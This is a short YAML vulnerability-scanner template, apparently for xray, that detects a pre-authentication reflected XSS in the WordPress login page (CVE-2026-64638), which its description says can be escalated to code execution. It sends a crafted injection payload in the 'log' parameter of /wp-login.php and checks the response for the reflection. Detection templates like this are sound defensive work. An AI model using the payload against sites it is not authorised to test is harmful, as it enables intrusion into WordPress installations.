name: poc-yaml-wordpress-xss2shell-xss
set:
  r1: randomLowercase(8)
groups:
  detect:
    - method: POST
      path: /wp-login.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: >-
        log=%3C+area+id=ajaxurl+href=/?rest_route=/&_method=GET&_jsonp=confirm&_envelope=1&pwd=test&wp-submit=Log+In
      follow_redirects: false
      expression: >
        response.status == 200 && response.body.bcontains(b"ajaxurl") && response.body.bcontains(b"rest_route")
detail:
  author: L4xy
  description: "WordPress Core 6.4-7.0.2存在预认证反射型XSS漏洞(CVE-2026-64638)，攻击者可通过登录页面的log参数注入恶意JavaScript代码，可被利用升级为RCE(XSS2Shell)"
  links:
    - https://github.com/4minx/CVE-2026-64638/blob/main/README.md
    - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-52p2-r8wf-jcrf
    - https://hadrian.io/blog/wordpress-xss2shell-unauthenticated-login-screen-xss-to-php-code-execution-cve-2026-64638
    - https://nvd.nist.gov/vuln/detail/CVE-2026-64638
  tags: xss,wordpress,xss2shell